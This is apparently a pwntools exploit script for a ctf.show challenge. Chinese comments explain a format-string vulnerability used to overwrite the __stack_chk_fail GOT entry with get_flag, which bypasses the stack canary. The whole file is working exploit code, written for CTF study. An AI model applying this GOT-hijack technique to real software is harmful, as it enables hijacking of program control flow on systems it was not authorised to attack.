from pwn import *

#context(arch = 'amd64', os = 'linux', log_level = 'debug')
context(arch = 'i386', os = 'linux', log_level = 'debug')

io = remote('pwn.challenge.ctf.show', 28250)
elf = ELF('./pwn')
libc = ELF('./libc.so.6')

# stack_chk_fail_got = elf.got['__stack_chk_fail']：__stack_chk_fail函数的GOT表地址
# __stack_chk_fail是Canary保护触发时调用的函数
stack_chk_fail_got = elf.got['__stack_chk_fail']

# getflag = elf.sym['get_flag']：get_flag函数的地址
# 我们要将__stack_chk_fail的GOT表项修改为get_flag的地址
getflag = elf.sym['get_flag']

# payload = fmtstr_payload(7, {stack_chk_fail_got:getflag})：构造格式化字符串payload
# 7：格式化字符串的偏移量
# {stack_chk_fail_got:getflag}：将__stack_chk_fail的GOT表地址覆盖为getflag函数地址
payload = fmtstr_payload(7, {stack_chk_fail_got:getflag})
payload = payload.ljust(0x50, b'a')

io.sendline(payload)
io.recv()
io.interactive()

"""
【知识点讲解】
1. 题目类型：fmtstr + GOT hijack - 格式化字符串漏洞劫持GOT表
2. 核心原理：
   - 利用格式化字符串漏洞覆盖__stack_chk_fail的GOT表项
   - 当Canary保护被触发时，会调用__stack_chk_fail，实际上执行get_flag函数
3. 关键步骤：
   - 获取__stack_chk_fail的GOT表地址和get_flag函数地址
   - 构造格式化字符串payload，将GOT表项修改为get_flag地址
   - 发送payload触发漏洞
4. 执行流程：
   - 构造并发送格式化字符串payload
   - 覆盖__stack_chk_fail的GOT表项
   - 当程序触发Canary保护时，执行get_flag函数
5. 技术要点：
   - 格式化字符串漏洞的利用
   - GOT表劫持技术
   - Canary保护机制的绕过
"""
